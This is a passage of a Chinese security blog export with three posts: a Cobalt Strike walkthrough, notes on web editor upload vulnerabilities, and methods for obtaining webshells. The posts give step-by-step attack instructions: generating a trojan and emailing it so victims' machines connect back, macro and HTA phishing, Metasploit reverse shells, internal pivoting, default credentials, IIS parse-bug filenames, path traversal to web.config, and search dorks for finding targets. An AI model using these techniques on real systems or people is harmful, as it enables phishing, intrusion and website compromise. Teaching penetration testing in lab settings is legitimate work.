<p><img src="/image/apt/6.jpg"></p>
<p><img src="/image/apt/7.jpg"></p>
<p>我们也可以使用图标修改器改图标</p>
<h2 id="完成文件困绑试验"><a href="#完成文件困绑试验" class="headerlink" title="完成文件困绑试验"></a>完成文件困绑试验</h2><p><img src="/image/apt/8.jpg"></p>
<p><img src="/image/apt/9.jpg"></p>
<h2 id="完成综合apt攻击工具cs木马上线实验"><a href="#完成综合apt攻击工具cs木马上线实验" class="headerlink" title="完成综合apt攻击工具cs木马上线实验"></a>完成综合apt攻击工具cs木马上线实验</h2><p>CobaltStrike是一款美国Red</p>
<p>Team开发的渗透测试神器，常被业界人称为CS。最近这个工具大火，成为了渗透测试中不可缺少的利器。其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。同时，Cobalt</p>
<p>Strike还可以调用Mimikatz等其他知名工具，因此广受黑客喜爱。</p>
<p>CobaltStrike分为客户端和服务端可分布式操作可以协同作战。但一定要架设在外网上。当然你知道利用这款工具主要用于内网渗透以及APT攻击。</p>
<p>项目官网:<a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com</a></p>
<h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a><strong>实验环境：</strong></h4><p>服务器端（Linux）：192.168.0.109 靶机（windows）:192.168.19.130</p>
<p>使用cobaltstrike 3.14</p>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a><strong>实验步骤</strong></h3><p>将工具上传到kali系统中运行时给777权限</p>
<p>root@kali:/mnt/cobaltstrike# chmod 777 /mnt/cobaltstrike/</p>
<h5 id="一、启动，连接服务器"><a href="#一、启动，连接服务器" class="headerlink" title="一、启动，连接服务器"></a>一、启动，连接服务器</h5><p>启动服务端：(test 为待会靶机连接服务器的密码）./teamserver 192.168.0.109 test</p>
<p>Test为密码hash密码要与客户端一样诺不一样则此软件存在后面</p>
<p><img src="/image/apt/10.jpg"></p>
<p>密码设置为test你可以设置为其它</p>
<p>客户端连接服务器运行：cs.bat</p>
<p><img src="/image/apt/11.jpg"></p>
<p>启动客户端，输入ip，密码，端口，用户默认</p>
<p>如果客户端 是Linux操作系统则运行以下命令，启动客户端：java -Dfile.encoding=UTF-8</p>
<p>-javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap</p>
<p>-XX:+UseParallelGC -jar cobaltstrike.jar</p>
<p>创建监听器。</p>
<h4 id="创建监听器"><a href="#创建监听器" class="headerlink" title="创建监听器"></a><strong>创建监听器</strong></h4><blockquote>
<p>1、点击 Cobalt Strike -&gt;</p>
<p>Listeners-&gt;Add，其中内置了八个Payload，</p>
<p>wndows/beacon_dns/reverse_dns_txt</p>
<p>windows/beacon_http/reverse_http</p>
<p>windows/beacon_https/reverse_https</p>
<p>windows/beacon_bind_pipe</p>
<p>windows/beacon_tcp</p>
<p>windows/beacon_extc2</p>
<p>windows/foreign/reverse_http</p>
<p>windows/foreign/reverse_https</p>
</blockquote>
<p><img src="/image/apt/12.jpg"></p>
<p><img src="/image/apt/13.jpg"></p>
<h4 id="生成木马创建payload-让主机上线"><a href="#生成木马创建payload-让主机上线" class="headerlink" title="生成木马创建payload 让主机上线"></a><strong>生成木马创建payload 让主机上线</strong></h4><p><img src="/image/apt/14.jpg"></p>
<p><img src="/image/apt/15.jpg"></p>
<p>运行该exe主机成功上线：可以查看上线主机的磁盘信息，进行端口扫描，查看进程等信息。</p>
<p>同理如果将生成的artifact.exe作为附件发送给其他人，只要有人点击，则他的机器会上线。不过现在的电脑都装了杀毒软件，所以payload需做免杀。这个后续在研发</p>
<p><img src="/image/apt/16.jpg"></p>
<p><img src="/image/apt/17.jpg"></p>
<h2 id="HttpsPayload应用"><a href="#HttpsPayload应用" class="headerlink" title="HttpsPayload应用"></a>HttpsPayload应用</h2><p>优点：可能过行为查杀、另外administrator运行可直接提升为system权限</p>
<p>第一步</p>
<p><img src="/image/cs/1.jpg"></p>
<p>Windows Service需要向操作系统注册EXE直接运行  </p>
<p><img src="/image/cs/2.jpg"></p>
<p>第二步：创建服务</p>
<p>Sc create test binpath= ”c:\test.exe”      //创建的服务名，binPath后面是运行exe文件的所在路径    创建一个路径一般放在C:\Windows\System32下因为这个路径执行文件最多</p>
<p>start= auto displayname= ”test”          //<strong>将exe注册为windows服务 displayname</strong>服务器名称</p>
<p>Sc start test                    //开启这个服务</p>
<p>Sc delete test                   //删除这个服务</p>
<p>Sc top test                       //首先使用这个服务 </p>
<h2 id="sc配置服务"><a href="#sc配置服务" class="headerlink" title="sc配置服务"></a>sc配置服务</h2><blockquote>
<p>有以下集中方式：</p>
<p>sc config 服务名 start= AUTO    (自动)</p>
<p>sc config 服务名 start= DEMAND  (手动)</p>
<p>sc config 服务名 start= DISABLED(禁用)</p>
</blockquote>
<p>关于SC</p>
<p>可参考一个网友的博文—SC命令管理服务状态：<a href="https://links.jianshu.com/go?to=http://blog.csdn.net/ddjj_1980/article/details/7493045">http://blog.csdn.net/ddjj_1980/article/details/7493045</a></p>
<h2 id="结合metasploit-反弹shell"><a href="#结合metasploit-反弹shell" class="headerlink" title="结合metasploit,反弹shell"></a>结合metasploit,反弹shell</h2><ol>
<li>MSF中use exploit/multi/handler，然后set payload windows/meterpreter/reverse_tcp、set lhost、set lport；然后CS中新建监听器；一个test社工肉鸡运行，然后新建监听器reverse_tcp派生会话，run：</li>
</ol>
<p><img src="/image/cs/3.jpg"></p>
<p>新建两个监听器一个放木马上线</p>
<p>在靶机中使用Cobalt Strike创建一个windows/foreign/reverse_tcp的Listener。其中ip为Metasploit的ip地址，端口为Metasploit所监听的端口。</p>
<p>选中刚刚新建msf</p>
<p><img src="/image/cs/4.jpg"></p>
<p><img src="/image/cs/5.jpg"></p>
<p><img src="/image/cs/6.jpg"></p>
<p><img src="/image/cs/7.jpg"></p>
<p>session -i查看会话然后session -i 1进入</p>
<p>派生给reverse_tcp然后Exploit</p>
<h2 id="office宏钓鱼"><a href="#office宏钓鱼" class="headerlink" title="office宏钓鱼"></a>office宏钓鱼</h2><p>攻击→后门→MS office 然后复制恶意代码→插入office的宏中，社工肉鸡打开即可</p>
<p><img src="/image/cs/8.jpg"></p>
<p><img src="/image/cs/9.jpg"></p>
<p> MSF中use exploit/multi/handler，然后set payload windows/meterpreter/reverse_tcp、set lhost、set lport；然后CS中新建监听器；一个test社工肉鸡运行，然后新建监听器reverse_tcp派生会话，run：或使用另一个监听器可以直接在图形化界面使用</p>
<p>或使用另一个监听器可以直接在图形化界面使用</p>
<p><img src="/image/cs/10.jpg"></p>
<p>下载运行则中招</p>
<p>Cs 生成的代码直接放到创建里面去，注意：做试验的时候，宏的位置不要设置所有的活动模板和文档，建设应用在当前文档，不然本机所有word文档运行都会种上你的木马，另外打开word文档有宏提示，一般是word默认禁用所有宏（文件—选项—信任中心—信任中心设置里面配置）。</p>
<h2 id="hta网页挂马"><a href="#hta网页挂马" class="headerlink" title="hta网页挂马"></a>hta网页挂马</h2><p>第一步：生成hta</p>
<p><img src="/image/cs/11.jpg"></p>
<p><img src="/image/cs/12.jpg"></p>
<p>第二步：使用文件下载</p>
<p><img src="/image/cs/13.jpg"></p>
<p><img src="/image/cs/14.jpg"></p>
<p>点击开始之后，evil.hta文件会自动传到cs uploads目录。</p>
<p><img src="/image/cs/15.jpg"></p>
<p><img src="/image/cs/16.jpg"></p>
<p>如果之前设置过钓鱼页面，记得一定要删掉，不然会克隆的时候会报错</p>
<p><img src="/image/cs/17.jpg"></p>
<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>\1. 先制作HTML：<a href="http://192.168.1.184/test.hta">http://192.168.1.184:80/test.hta</a></p>
<p>\2. 钓鱼攻击→文件下载：<a href="http://192.168.1.184/download/file.ext">http://192.168.1.184:80/download/file.ext</a></p>
<p>\3. 钓鱼攻击→克隆网站：<a href="http://192.168.1.184/">http://192.168.1.184:80/</a></p>
<p>\4. 社工肉鸡打开：</p>
<p><img src="/image/cs/18.jpg"></p>
<p>键盘记录</p>
<h2 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h2><p>\1. 邮件钓鱼：</p>
<p><img src="/image/cs/19.jpg"></p>
<p><img src="/image/cs/20.jpg"></p>
<p>附件下载后运行</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>制作好钓鱼页面：可以使用<a href="https://bitly.com制作短网址，然后让对方打开：">https://bitly.com制作短网址，然后让对方打开：</a></p>
<p><img src="/image/cs/21.jpg"></p>
<p>然后设置好跳转的网址</p>
<p><img src="/image/cs/22.jpg"></p>
<p>以通过<a href="https://bitly.com生成url短链接/">https://bitly.com生成url短链接</a> （）   </p>
<h2 id="socks代理："><a href="#socks代理：" class="headerlink" title="socks代理："></a>socks代理：</h2><p>win7双网卡：内网：172.16.2.1    </p>
<p>win2003：172.16.2.2</p>
<p><img src="/image/cs/23.jpg"></p>
<p>win7双网卡</p>
<p><img src="/image/cs/24.jpg"></p>
<p>2003内网：172.16.2.1</p>
<p>MSF中：setg Proxies socks4:192.168.1.184:40520；use auxiliary/scanner/smb/smb_version；然后set rhosts 172.16.2.2；run</p>
<p><img src="/image/cs/25.jpg"></p>
<p><strong>setg Proxiessocks4:192.168.0.106:6677</strong></p>
<p>也可以使用下面方法：</p>
<p>开启socks4a代理，通过代理进行内网渗透</p>
<p>开启socks，可以通过命令，也可以通过右键Pivoting-&gt;SOCKS Server</p>
<p>beacon&gt; socks2222</p>
<p>[+] startedSOCKS4a server on: 2222</p>
<p>[+] host calledhome, sent: 16 bytes</p>
<p>然后vim</p>
<p>/etc/proxychains.conf ，在文件末尾添加socks4代理服务器</p>
<p><img src="/image/cs/26.jpg"></p>
<p>使用proxychains代理扫描内网主机  proxychains nmap -sP192.168.183.0/24</p>
<p><img src="/image/cs/27.jpg"></p>
<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a><strong>小结：</strong></h3><p>\1. CS可以创建多个客户端，操作方便</p>
<p>\2. 功能扩展比较多，如：payload可以多种语言。</p>
<p>\3. 支持宏的办公软件都可以（office/WPS）</p>
<p>\4. 默认宏安全性高/非常安全，运行宏时会提示；中低不会提示，打开world有提示，说明宏很有可能有木马。</p>
<hr>
<h2 id="cs提权"><a href="#cs提权" class="headerlink" title="cs提权"></a>cs提权</h2><p>你以什么权限运行的木马，那么木马将拥有此权限，如果权限过低我们只能进行提权。</p>
<p>提权插件下载<a href="https://links.jianshu.com/go?to=https://github.com/rsmudge/Elevatekit">https://github.com/rsmudge/Elevatekit</a></p>
<p><a href="https://links.jianshu.com/go?to=http://k8gege.org/Download/">http://k8gege.org/Download/</a></p>
<p><a href="https://links.jianshu.com/go?to=https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
<p><img src="/image/cs/28.jpg"></p>
<p>选择脚本管理器将下载好的插件放入进去不要有中午目录</p>
<p><img src="/image/cs/29.jpg"></p>
<hr>
<p>内网渗透插件加使用方法</p>
<p><a href="https://links.jianshu.com/go?to=https://github.com/k8gege/Aggressor">https://github.com/k8gege/Aggressor</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>编辑器漏洞</title>
    <url>/2019/07/09/%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="一-本文介绍"><a href="#一-本文介绍" class="headerlink" title="一.本文介绍"></a>一.本文介绍</h3><p><strong>1、</strong>本文介绍Ewebeditor常识、获取webshell、fckeditor获取webshell、旁注原理、ip逆向查询、目录越权及跨库查询、cdn绕过。</p>
<h2 id="二-学习步骤"><a href="#二-学习步骤" class="headerlink" title="二.学习步骤"></a>二.学习步骤</h2><h3 id="1、Ewebeditor常识："><a href="#1、Ewebeditor常识：" class="headerlink" title="1、Ewebeditor常识："></a>1、Ewebeditor常识：</h3><p><strong>默认后台</strong>：xxxx.com/ewebeditor/admin_login.asp</p>
<p><strong>数据库地址</strong>：ewebeditor/db/ewebeditor.mdb</p>
<p><strong>帐号</strong>：admin     密码：admin/admin888/admin000(各种弱口令)</p>
<p><strong>常用数据库路径为:</strong></p>
<p>ewebeditor/db/ewebeditor.asa</p>
<p>ewebeditor/db/ewebeditor.asp</p>
<p>ewebeditor/db/#ewebeditor.asa</p>
<p>ewebeditor/db/#ewebeditor.mdb</p>
<p>ewebeditor/db/ewebeditor.mdb</p>
<p>ewebeditor/db/!@#ewebeditor.asp</p>
<p>ewebeditor/db/ewebeditor1033.mdb 等</p>
<p>默认数据库下载报错。(.mdb被保护了，从这里找到.mdb删除就好了)</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/1.jpg"></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/2.jpg"></p>
<h3 id="2、Ewebeditor后台获取webshell"><a href="#2、Ewebeditor后台获取webshell" class="headerlink" title="2、Ewebeditor后台获取webshell"></a>2、Ewebeditor后台获取webshell</h3><p>\1. <a href="http://ip/admin_login.asp%EF%BC%9A%E8%B4%A6%E5%8F%B7%EF%BC%9Aadmin">http://IP/admin_login.asp：账号：admin</a> 密码：admin，然后添加样式，</p>
<p>在图片类型中加入以下类型:<a href="">asa|cer|asp|aaspsp</a></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/3.jpg"><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/4.jpg"></p>
<p>最后添加工具栏：插入或修改图片</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/5.jpg"></p>
<ol start="2">
<li>工具栏添加好后点击“预览”，上传在样式的图片格式中加入cer或asp等，我上传的是shell.cer，然后在代码的地方可以看到URL，然后菜刀连接即可。用低版本浏览器，高版本可能打不开.</li>
</ol>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/6.jpg"></p>
<h4 id="2）目录遍历"><a href="#2）目录遍历" class="headerlink" title="2）目录遍历"></a>2）目录遍历</h4><p> 点击”上传文件管理” 然后选择样式目录。</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/7.jpg"></p>
<p>在id=14后面加上&amp;dir=../，发现没有起作用，那就是2.1.6这个版本不存在这个漏洞。换成2.8.0。2.8.0存在这个文件遍历漏洞。</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/8.jpg"></p>
<p>\4. 在下载的数据库中看eWebEditor_style表中的S_ImageExt字段是否有被人添加过什么。</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/9.jpg"></p>
<p>使用下面的语句进入突破:</p>
<p>ewebeditor.asp?ID=xx&amp;style=yy  其中的id=xx就是被修改过的那条记录的id，而yy就是S_name字段的名字。</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/10.jpg"></p>
<h3 id="3、Ewebeditor文件上传实验"><a href="#3、Ewebeditor文件上传实验" class="headerlink" title="3、Ewebeditor文件上传实验"></a>3、Ewebeditor文件上传实验</h3><p><strong>将代码新建为html：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;input type&#x3D;file name&#x3D;uploadfile size&#x3D;100&gt;&lt;br&gt;&lt;br&gt;&lt;input type&#x3D;submit value&#x3D;Fuck&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>创建完直接打开，点击上传按钮将马上传，右键查看源代码：</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/20.jpg"></p>
<p>默认文件上传保存的路径为ewebiditor/uploadfile，访问：<a href="http://ip/uploadfile/2020417145621756.cer%EF%BC%8C%E8%BE%93%E5%85%A5%E9%A9%AC%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%9A">http://IP/uploadfile/2020417145621756.cer，输入马的密码：</a></p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/11.jpg"></p>
<h3 id="4、fckeditor获取webshell"><a href="#4、fckeditor获取webshell" class="headerlink" title="4、fckeditor获取webshell"></a>4、fckeditor获取webshell</h3><p><strong>1.查看编辑器版本</strong></p>
<p>FCKeditor/_whatsnew.html</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/12.jpg"></p>
<p><strong>2.FCKeditor编辑器页</strong></p>
<p>FCKeditor/_samples/default.html</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/21.jpg"></p>
<p><strong>3.常用上传地址</strong></p>
<p>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</p>
<p>FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/</p>
<p>FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp</p>
<p>FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp</p>
<p>2.5的版本下面这条语句能用：</p>
<h5 id="http-192-168-87-129-8234-editor-filemanager-browser-default-browser-html-Type-Image-amp-Connector-connectors-asp-connector-asp"><a href="#http-192-168-87-129-8234-editor-filemanager-browser-default-browser-html-Type-Image-amp-Connector-connectors-asp-connector-asp" class="headerlink" title="http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp"></a><a href="http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp">http://192.168.87.129:8234//editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=../../connectors/asp/connector.asp</a></h5><p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/14.jpg"></p>
<p><strong>根据提示，需要：</strong></p>
<p>开启文件上传功能,把\editor\filemanager\connectors\asp\config.asp文件中的</p>
<p>DimConfigIsEnabled</p>
<p>ConfigIsEnabled = False</p>
<p>设置成功true。</p>
<p>手工新建：</p>
<p>/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/&amp;NewFolderName=fendo.asp</p>
<p>原因：</p>
<p>CurrentFolder：当前文件夹 未进行过滤(这个文件夹下的没有过滤)</p>
<p>NewFolderName：新建文件名 进行了过滤</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/15.jpg"></p>
<p>添加敏感文件夹</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/16.jpg"></p>
<p>敏感目录</p>
<p><img src="/image/%E7%BC%96%E8%BE%91%E5%99%A8/17.jpg"></p>
<p>登录即可获取shell</p>
<h3 id="CKFinder编辑器："><a href="#CKFinder编辑器：" class="headerlink" title="CKFinder编辑器："></a><strong>CKFinder编辑器：</strong></h3><p>任意文件上传漏洞</p>
<p>其1.4.3 asp.net版本存在任意文件上传漏洞，攻击者可以利用该漏洞上传任意文件，CKFinder在上传文件的时候，强制将文件名(不包括后缀)中点号等其他字符转为下划线_,但是在修改文件名时却没有任何限制，从而导致可以上传1_php;1.jpg等畸形文件名，最终导致文件上传漏洞</p>
<p>然后修改文件名</p>
<p>1_php;1.jpg</p>
<p>利用iis6.0目录解析漏洞拿shell</p>
<p>创建目录/x.asp/</p>
<p>在目录下上传图片马即可拿shell</p>
<h3 id="southidceditor-：南方数据编辑器"><a href="#southidceditor-：南方数据编辑器" class="headerlink" title="southidceditor ：南方数据编辑器"></a>southidceditor ：南方数据编辑器</h3><p>任意文件上传漏洞</p>
<p>首先登陆后台</p>
<p>利用编辑器上传</p>
<p>访问admin/southidceditor/admin_style.asp</p>
<p>修改编辑器样式，增加asa(不要asp).然后直接后台编辑新闻上传</p>
<h3 id="UEDITOR编辑器："><a href="#UEDITOR编辑器：" class="headerlink" title="UEDITOR编辑器："></a>UEDITOR编辑器：</h3><p>利用ii6.0文件名解析漏洞</p>
<p>上传图片改名为：</p>
<p>x.php;20221.jpg获取shell</p>
<h3 id="DotNetTextBox编辑器："><a href="#DotNetTextBox编辑器：" class="headerlink" title="DotNetTextBox编辑器："></a>DotNetTextBox编辑器：</h3><p>任意文件上传漏洞</p>
<p>关键字:system_dntb/</p>
<p>确定有system_dntb/uploadimg.aspx并能打开，这时候是不能上传的，由于他是验证cookie来得出上传后的路径，这样我们可以用cookie欺骗工具</p>
<p>cookie:UserType=0;IsEdition=0;Info=1;</p>
<p>uploadFolder=../system_dntb/Upload/;</p>
<p>路径可以修改，只要权限够，上传后改名为1.asp;.jpg利用iis解析漏洞</p>
<h4 id="Kedit编辑器：PHPWEB网站管理系统后台"><a href="#Kedit编辑器：PHPWEB网站管理系统后台" class="headerlink" title="Kedit编辑器：PHPWEB网站管理系统后台"></a>Kedit编辑器：PHPWEB网站管理系统后台</h4><p>两种利用方式：</p>
<p><strong>第一种是利用iis6.0文件名解析漏洞：</strong></p>
<p>xx.php;xx.jpg</p>
<p><strong>第二种方式：</strong></p>
<p>%00截断</p>
<p>xx.php%00jpg</p>
<h3 id="ute-Editor在线编辑器："><a href="#ute-Editor在线编辑器：" class="headerlink" title="ute Editor在线编辑器："></a>ute Editor在线编辑器：</h3><p><strong>本地包含漏洞</strong></p>
<p><strong>影响版本：</strong></p>
<p>Cute Editor For Net 6.4</p>
<p><strong>脆弱描述：</strong></p>
<p>可以随意查看网站文件内容，危害较大</p>
<p><strong>攻击利用：</strong></p>
<p><a href="http://www.xx.com/Cute_Client?CuteEditor/Load.ashx?type=image&amp;file=../../../web.config">http://www.xx.com/Cute_Client?CuteEditor/Load.ashx?type=image&amp;file=../../../web.config</a></p>
<p>Cute Editor Asp.Net版：</p>
<p>利用iis解析漏洞获得权限</p>
<p><strong>影响版本：</strong></p>
<p>CuteEditor for ASP.NET中文版脆弱描述：</p>
<p><strong>脆弱描述：</strong></p>
<p>CuteEditor对上传文件名未重命名，导致其可利用IIS文件名解析Bug获得webshell权限。</p>
<p><strong>攻击利用：</strong></p>
<p>可通过在搜索引擎中键入关键字 inurl:Post.aspx?SmallClassID= 来找到测试目标。</p>
<p>在编辑器中点击“多媒体插入”，上传一个名为“xxx.asp;.avi”的网马，以此获得权限。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>脚本后门分析</title>
    <url>/2019/11/12/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h1><p><img src="/image/%E8%84%91%E5%9B%BE/%E8%84%9A%E6%9C%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90.png"></p>
<h1 id="✨获取webshell主要分两大类："><a href="#✨获取webshell主要分两大类：" class="headerlink" title="✨获取webshell主要分两大类："></a>✨获取webshell主要分两大类：</h1><blockquote>
<p>一、cms获取webshell</p>
<p>二、非cms获取webshell</p>
</blockquote>
<hr>
<h1 id="🧨什么是CMS"><a href="#🧨什么是CMS" class="headerlink" title="🧨什么是CMS"></a>🧨什么是CMS</h1><blockquote>
<p>CMS系统指的是内容管理系统。内容管理系统（CMS）是允许用户将内容直接发布到Web的接口。将内容页面直接添加到Web的过程比从本地计算机创建和上载页面提前一步，因为它允许大量人员远程添加和共享数据。</p>
<p>通俗来讲：CMS可以理解为CMS帮你把一个网站的程序部分的事全做完了；你要做的只是一个网站里面美工的部份</p>
</blockquote>
<hr>
<h1 id="🎃一、cms获取webshell"><a href="#🎃一、cms获取webshell" class="headerlink" title="🎃一、cms获取webshell"></a>🎃一、cms获取webshell</h1><p>我们打开一个网站的时候利用wappalyzer插件可以看到网站的cms指纹信息<br>然后我们可以百度获取webshell方法，因为这些都是公开的</p>
<p><strong>获取cms方法</strong></p>
<blockquote>
<p>进入后台之后可以查看<br>查看CMS系统<br>有可能直接显示<br>有可能会在最下方信息中显示<br>有可能要使用工具<br>御剑web指纹识别<br>谷歌浏览器的wappalyzer</p>
</blockquote>
<p><img src="/image/webshell/1.jpg"></p>
<p><img src="/image/webshell/2.jpg"></p>
<hr>
<h1 id="🎇二、非cms获取webshell"><a href="#🎇二、非cms获取webshell" class="headerlink" title="🎇二、非cms获取webshell"></a>🎇二、非cms获取webshell</h1><p>当网站没有用开源的cms，或者使用自己开发的cms，我们如何获取webshell呢？首先分两种情况有管理权限（登录后台）、和无管理权限（没有登录后台）。</p>
<h2 id="🎫有管理权限下"><a href="#🎫有管理权限下" class="headerlink" title="🎫有管理权限下"></a>🎫有管理权限下</h2><h3 id="直接上传"><a href="#直接上传" class="headerlink" title="直接上传"></a><strong>直接上传</strong></h3><p>网站对上传文件后缀格式并未过滤，直接上传WebShell即可</p>
<p>大概思路是，已知后台管理员账号和密码，找有上传节点的地方，写一个隐蔽或变形的木马上传，上传成功后，用菜刀或蚁剑连接。</p>
<h3 id="添加后缀类型上传"><a href="#添加后缀类型上传" class="headerlink" title="添加后缀类型上传"></a><strong>添加后缀类型上传</strong></h3><p>注：为什么要写一个隐蔽或变形的木马呢？因为如果你用的常见的木马，只要一上传就会被管理员或WAF发现（常见的木马WAF都是有收集的，所以可以写完木马之后用D盾检查一下，被WAF检测出来的危险等级是多少）</p>
<h3 id="2-数据库备份与恢复"><a href="#2-数据库备份与恢复" class="headerlink" title="2.数据库备份与恢复"></a><a href="https://www.jianshu.com/writer">2.数据库备份与恢复</a></h3><p>把允许上传的格式的木马，备份或者恢复成木马格式</p>
<p>网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如 asp、php、jsp、aspx等。然后我们可以使用工具讲一句话木马插入图片中<br>而网站具有数据库备份功能，<strong>这时我们就可以将WebShell格式先改为允许上传的文件格式，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。</strong></p>
<p><strong>1）有些备份数据库的地方，限制了用户更改路径，那该怎么办？</strong></p>
<blockquote>
<p>F12打开开发者工具，修改文本框元素的value值为我们想要的路径或格式就可以完成修改</p>
</blockquote>
<p><strong>2）如果上传的格式被限制呢？该怎么办？</strong></p>
<blockquote>
<p>可以使用%00截断来绕过上传限制或使用BurpSuite 工具（%00截断、特殊名文件名绕过、文件名大小写绕过等等黑白名单绕过）之前讲过</p>
</blockquote>
<h3 id="3-本地js验证突破拿WebShell"><a href="#3-本地js验证突破拿WebShell" class="headerlink" title="3.本地js验证突破拿WebShell"></a><a href="https://www.jianshu.com/writer">3.本地js验证突破拿WebShell</a></h3><p>当网站设置了js来限制用户上传的文件类型时，<strong>可以通过删除js验证或者修改上传类型突破上传拿WebShell</strong>。（这种方法之前讲过，印象很深，最近有一篇绕过IWRITE写作平台防复制粘贴内个功能就是利用的这个方法）</p>
<p>或者使用BurpSuite 或者是 Fiddle等代理工具提交，本地文件先更改为jpg，上传时拦截，再把文件扩展名更改为asp或者php即可</p>
<h3 id="4、上传其它脚本类型拿WebShell"><a href="#4、上传其它脚本类型拿WebShell" class="headerlink" title="4、上传其它脚本类型拿WebShell"></a><a href="https://www.jianshu.com/writer">4、上传其它脚本类型拿WebShell</a></h3><p>1）此类型用于一台<strong>服务器具有多个网站</strong>，a网站是asp的站，b可能是php的站，而a站中限制了上传文件类型为asp的文件，你可以尝试上传php的脚本，来拿Shell</p>
<p>2）你也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.” 来突破文件类型限制进行上传拿WebShell</p>
<p>这个思路还是头一次见噢，有用的思路增加了！</p>
<h3 id="5、-00截断拿WebShell"><a href="#5、-00截断拿WebShell" class="headerlink" title="5、%00截断拿WebShell"></a><a href="https://www.jianshu.com/writer">5、%00截断拿WebShell</a></h3><p>很传统了不多说</p>
<blockquote>
<p>截断上传<br>%00截断<br>特殊文件名</p>
</blockquote>
<p>1）在上传文件的时候，你上传的文件名<strong>可能会被网站自动改成别的名字</strong>，这个时候你可以尝试抓取上传文件数据包，将文件名改为xx.asp%00.jpg进行截断上传，拿WebShell</p>
<h3 id="6、利用解析漏洞拿WebShell"><a href="#6、利用解析漏洞拿WebShell" class="headerlink" title="6、利用解析漏洞拿WebShell"></a><a href="https://www.jianshu.com/writer">6、利用解析漏洞拿WebShell</a></h3><p>可以看中间件漏洞那个栏目 个人认为记住几个常见的就好了吧，一般都是会查一遍的，这大便宜不捡白不捡</p>
<blockquote>
<p>1）IIS5.x / 6.0 解析漏洞<br>2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞<br>3）Nginx &lt; 8.03 空字节代码执行漏洞<br>畸形解析漏洞<br>4）Apache 解析漏洞<br>（由于Apache是从右到左开始判断解析的，如果不可识别解析，就再往左判断）</p>
</blockquote>
<h3 id="7、利用编辑器漏洞拿WebShell"><a href="#7、利用编辑器漏洞拿WebShell" class="headerlink" title="7、利用编辑器漏洞拿WebShell"></a><a href="https://www.jianshu.com/writer">7、利用编辑器漏洞拿WebShell</a></h3><p>同中间件</p>
<p>常见编辑器</p>
<blockquote>
<p>fckeditor<br>ewebeditor<br>cheditor</p>
</blockquote>
<h3 id="8、网站配置插马拿WebShell"><a href="#8、网站配置插马拿WebShell" class="headerlink" title="8、网站配置插马拿WebShell"></a><a href="https://www.jianshu.com/writer">8、网站配置插马拿WebShell</a></h3><p>通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该站源码，进行查看源码过滤规则，以防插马失败。</p>
<p>PS：插马失败很有可能会导致网站被你写的一句话木马，没有闭合标签导致被网站被插废。</p>
<p>数据库配置文件插马也是相同的</p>
